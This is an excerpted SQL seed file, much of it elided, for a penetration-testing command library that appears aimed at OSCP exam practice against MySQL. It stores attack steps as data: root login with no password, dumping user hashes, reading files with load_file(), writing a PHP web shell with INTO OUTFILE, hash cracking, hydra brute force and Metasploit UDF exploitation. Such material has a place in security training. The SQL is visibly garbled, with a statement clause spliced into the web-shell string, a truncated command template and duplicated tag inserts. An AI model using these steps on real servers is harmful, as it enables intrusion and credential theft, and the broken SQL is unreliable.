...
VALUES
    ('mysql-connect-root-nopass', (SELECT id FROM variables WHERE name = '<TARGET>'), 1, TRUE, '192.168.45.100') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('mysql-connect-root-nopass', '-h', 'Target host'),
    ('mysql-connect-root-nopass', '-u', 'Username (root)') ON CONFLICT (command_id, flag) DO NOTHING;
...
VALUES
    ...
    ('mysql-connect-root-nopass', 'failure', 'ERROR 1045', 'literal', 'Access denied error') ON CONFLICT DO NOTHING;

INSERT INTO tags (name) VALUES ('OSCP:HIGH'), ('OSCP:MEDIUM'), ('OSCP:LOW'), ('QUICK_WIN'), ('MANUAL'), ('AUTOMATED'), ('CRITICAL'), ('ENUM'), ('EXPLOIT'), ('LINUX'), ('WINDOWS'), ('NOISY'), ('NSE'), ('POST_ACCESS'), ('REQUIRES_AUTH'), ('REQUIRES_SHELL'), ('RESEARCH'), ('QUICK_WIN'), ('MANUAL'), ('REQUIRES_AUTH')
ON CONFLICT (name) DO UPDATE SET
    category = EXCLUDED.category,
    description = EXCLUDED.description,
...
INSERT INTO command_tags (command_id, tag_id) VALUES
    ...
    ('mysql-connect-root-nopass', (SELECT id FROM tags WHERE name = 'MANUAL')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-banner-grab', (SELECT id FROM variables WHERE name = '<PORT>'), 2, TRUE, '3306') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('mysql-banner-grab', '-v', 'Verbose'),
    ('mysql-banner-grab', '-n', 'No DNS') ON CONFLICT (command_id, flag) DO NOTHING;

INSERT INTO command_indicators (command_id, indicator_type, pattern, pattern_type, description)
VALUES
    ('mysql-banner-grab', 'success', 'Version', 'literal', 'Version string visible (5.x/8.x/MariaDB)'),
    ('mysql-banner-grab', 'failure', 'Connection refused', 'literal', 'Port closed or firewall') ON CONFLICT DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('mysql-banner-grab', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('mysql-banner-grab', (SELECT id FROM tags WHERE name = 'QUICK_WIN')),
    ('mysql-banner-grab', (SELECT id FROM tags WHERE name = 'MANUAL')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-nmap-enum', (SELECT id FROM variables WHERE name = '<PORT>'), 2, TRUE, '3306') ON CONFLICT (command_id, variable_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-nmap-enum', 'mysql-vuln-cve2012-2122', 'Test auth bypass vulnerability') ON CONFLICT (command_id, flag) DO NOTHING;
...
VALUES
    ...
    ('mysql-nmap-enum', 'failure', 'Access denied', 'literal', 'Authentication required') ON CONFLICT DO NOTHING;
...
INSERT INTO command_tags (command_id, tag_id) VALUES
    ...
    ('mysql-nmap-enum', (SELECT id FROM tags WHERE name = 'AUTOMATED')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-show-grants', (SELECT id FROM variables WHERE name = '<PASSWORD>'), 3, FALSE, '') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('mysql-show-grants', '-e', 'Execute command and exit'),
    ('mysql-show-grants', 'SHOW GRANTS', 'Display granted privileges'),
    ('mysql-show-grants', 'CURRENT_USER()', 'Current authenticated user') ON CONFLICT (command_id, flag) DO NOTHING;
...
VALUES
    ...
    ('mysql-show-grants', 'failure', 'Access denied', 'literal', 'Authentication failed') ON CONFLICT DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('mysql-show-grants', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('mysql-show-grants', (SELECT id FROM tags WHERE name = 'MANUAL')),
    ('mysql-show-grants', (SELECT id FROM tags WHERE name = 'REQUIRES_AUTH')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-enum-users', (SELECT id FROM variables WHERE name = '<PASSWORD>'), 3, FALSE, '') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('mysql-enum-users', 'authentication_string', 'Password hash (MySQL 5.7+)'),
    ('mysql-enum-users', 'file_priv', 'FILE privilege (Y/N)'),
    ('mysql-enum-users', 'Super_priv', 'SUPER privilege (Y/N)') ON CONFLICT (command_id, flag) DO NOTHING;
...
VALUES
    ...
    ('mysql-enum-users', 'failure', 'Access denied', 'literal', 'Insufficient privileges') ON CONFLICT DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('mysql-enum-users', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('mysql-enum-users', (SELECT id FROM tags WHERE name = 'REQUIRES_AUTH')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-enum-databases', (SELECT id FROM variables WHERE name = '<PASSWORD>'), 3, FALSE, '') ON CONFLICT (command_id, variable_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-enum-databases', 'failure', 'Access denied', 'literal', 'Insufficient privileges') ON CONFLICT DO NOTHING;
...
INSERT INTO command_tags (command_id, tag_id) VALUES
    ...
    ('mysql-enum-databases', (SELECT id FROM tags WHERE name = 'REQUIRES_AUTH')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-check-secure-file-priv', (SELECT id FROM variables WHERE name = '<PASSWORD>'), 3, FALSE, '') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('mysql-check-secure-file-priv', 'secure_file_priv', 'File operation restrictions (MySQL 5.5.53+)') ON CONFLICT (command_id, flag) DO NOTHING;
...
VALUES
    ...
    ('mysql-check-secure-file-priv', 'failure', 'Access denied', 'literal', 'Insufficient privileges') ON CONFLICT DO NOTHING;
...
INSERT INTO command_tags (command_id, tag_id) VALUES
    ...
    ('mysql-check-secure-file-priv', (SELECT id FROM tags WHERE name = 'REQUIRES_AUTH')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-read-file', (SELECT id FROM variables WHERE name = '<PASSWORD>'), 3, FALSE, '') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('mysql-read-file', 'load_file()', 'MySQL function to read file contents') ON CONFLICT (command_id, flag) DO NOTHING;
...
VALUES
    ...
    ('mysql-read-file', 'failure', 'secure-file-priv blocks', 'literal', 'Restrictions in place') ON CONFLICT DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('mysql-read-file', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('mysql-read-file', (SELECT id FROM tags WHERE name = 'REQUIRES_AUTH')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
INSERT INTO commands (
    ...
    'mysql -h <TARGET> -u <USER> -p<PASSWORD> -e "SELECT ''<?php system(\$_GET[\"cmd\"])
ON CONFLICT (id) DO UPDATE SET
    name = EXCLUDED.name,
    command_template = EXCLUDED.command_template,
    description = EXCLUDED.description,
...
VALUES
    ...
    ('mysql-write-shell', (SELECT id FROM variables WHERE name = '<PASSWORD>'), 3, FALSE, '') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('mysql-write-shell', 'INTO OUTFILE', 'Write query result to file'),
    ('mysql-write-shell', '<?php system($_GET["cmd"]) ON CONFLICT (command_id, flag) DO NOTHING; ?>', 'Minimal PHP web shell');
...
VALUES
    ...
    ('mysql-write-shell', 'failure', 'File exists', 'literal', 'File already present') ON CONFLICT DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('mysql-write-shell', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('mysql-write-shell', (SELECT id FROM tags WHERE name = 'REQUIRES_AUTH')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-debian-cnf', 'failure', 'File not found', 'literal', 'Not Debian/Ubuntu') ON CONFLICT DO NOTHING;
...
INSERT INTO command_tags (command_id, tag_id) VALUES
    ...
    ('mysql-debian-cnf', (SELECT id FROM tags WHERE name = 'REQUIRES_SHELL')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
INSERT INTO command_vars (command_id, variable_id, position, is_required, example_value)
VALUES
    ('mysql-crack-hashes', (SELECT id FROM variables WHERE name = '<WORDLIST>'), 1, TRUE, '/usr/share/wordlists/rockyou.txt') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('mysql-crack-hashes', '-a 0', 'Straight wordlist attack'),
    ('mysql-crack-hashes', '-m 300', 'MySQL4.1/5.x (mysql_native_password)'),
    ('mysql-crack-hashes', '-m 21100', 'MySQL 8.0+ (caching_sha2_password)') ON CONFLICT (command_id, flag) DO NOTHING;
...
VALUES
    ...
    ('mysql-crack-hashes', 'failure', 'Wrong hash format', 'literal', 'Incorrect hash type') ON CONFLICT DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('mysql-crack-hashes', (SELECT id FROM tags WHERE name = 'OSCP:MEDIUM')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
INSERT INTO command_vars (command_id, variable_id, position, is_required, example_value)
VALUES
    ('mysql-hydra-bruteforce', (SELECT id FROM variables WHERE name = '<TARGET>'), 1, TRUE, '192.168.45.100') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('mysql-hydra-bruteforce', '-L', 'Username list'),
    ('mysql-hydra-bruteforce', '-P', 'Password list') ON CONFLICT (command_id, flag) DO NOTHING;
...
VALUES
    ...
    ('mysql-hydra-bruteforce', 'failure', 'Lockout', 'literal', 'Account locked') ON CONFLICT DO NOTHING;
...
INSERT INTO command_tags (command_id, tag_id) VALUES
    ...
    ('mysql-hydra-bruteforce', (SELECT id FROM tags WHERE name = 'NOISY')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-msf-hashdump', (SELECT id FROM variables WHERE name = '<PASSWORD>'), 4, FALSE, '') ON CONFLICT (command_id, variable_id) DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation)
VALUES
    ('mysql-msf-hashdump', '-q', 'Quiet mode (no banner)'),
    ('mysql-msf-hashdump', '-x', 'Execute commands and exit') ON CONFLICT (command_id, flag) DO NOTHING;
...
VALUES
    ...
    ('mysql-msf-hashdump', 'failure', 'Access denied', 'literal', 'Insufficient privileges') ON CONFLICT DO NOTHING;

INSERT INTO command_tags (command_id, tag_id) VALUES
    ('mysql-msf-hashdump', (SELECT id FROM tags WHERE name = 'OSCP:MEDIUM')),
    ('mysql-msf-hashdump', (SELECT id FROM tags WHERE name = 'AUTOMATED')),
    ('mysql-msf-hashdump', (SELECT id FROM tags WHERE name = 'REQUIRES_AUTH')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-msf-udf', (SELECT id FROM variables WHERE name = '<LHOST>'), 5, TRUE, '192.168.45.X') ON CONFLICT (command_id, variable_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-msf-udf', 'failure', 'SUPER privilege missing', 'literal', 'Cannot create UDFs') ON CONFLICT DO NOTHING;
...
INSERT INTO command_tags (command_id, tag_id) VALUES
    ...
    ('mysql-msf-udf', (SELECT id FROM tags WHERE name = 'REQUIRES_AUTH')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-find-configs', 'failure', 'Permission denied', 'literal', 'Insufficient access') ON CONFLICT DO NOTHING;
...
INSERT INTO command_tags (command_id, tag_id) VALUES
    ...
    ('mysql-find-configs', (SELECT id FROM tags WHERE name = 'REQUIRES_SHELL')) ON CONFLICT (command_id, tag_id) DO NOTHING;
...
VALUES
    ...
    ('mysql-history', 'failure', 'Empty history', 'literal', 'No commands saved') ON CONFLICT DO NOTHING;
...
INSERT INTO command_tags (command_id, tag_id) VALUES
    ...
    ('mysql-history', (SELECT id FROM tags WHERE name = 'REQUIRES_SHELL')) ON CONFLICT (command_id, tag_id) DO NOTHING;
